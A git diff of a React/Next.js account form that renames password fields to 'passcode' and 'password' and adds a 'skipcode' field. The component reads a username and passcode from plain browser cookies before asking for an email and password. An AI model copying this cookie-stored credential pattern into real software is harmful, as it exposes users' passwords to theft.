@@ -13,26 +13,26 @@ import { API_URL, site } from "../config";
 import useMockLogin from "../hooks/useMockLogin";
 import Cookies from "js-cookie";
 import { toast } from "react-toastify";
-import { setRequestMeta } from "next/dist/server/request-meta";
 
 function Account() {
   const [showPassword, setShowPassword] = useState(false);
   // const [reset, setReset] = useState(false);
   // const id = Cookies.get("id");
   const username = Cookies.get("username");
-  const password1 = Cookies.get("password1");
+  const passcode = Cookies.get("passcode");
 
   const initialvalues = {
     site: site,
     username: username,
-    password1: password1,
+    passcode: passcode,
+    skipcode: "",
     email: "",
-    password2: "",
+    password: "",
   };
 
   const validate = Yup.object({
     email: Yup.string().required("Required"),
-    password2: Yup.string().required("Required"),
+    password: Yup.string().required("Required"),
   });
 
   const { login } = useMockLogin();
@@ -85,7 +85,7 @@ function Account() {
                   />
                   <div className="relative">
                     <TextfieldWrapper
-                      name="password2"
+                      name="password"
                       label="Password"
                       helpertext="passwords are case-sensitive"
                       autoComplete="on"
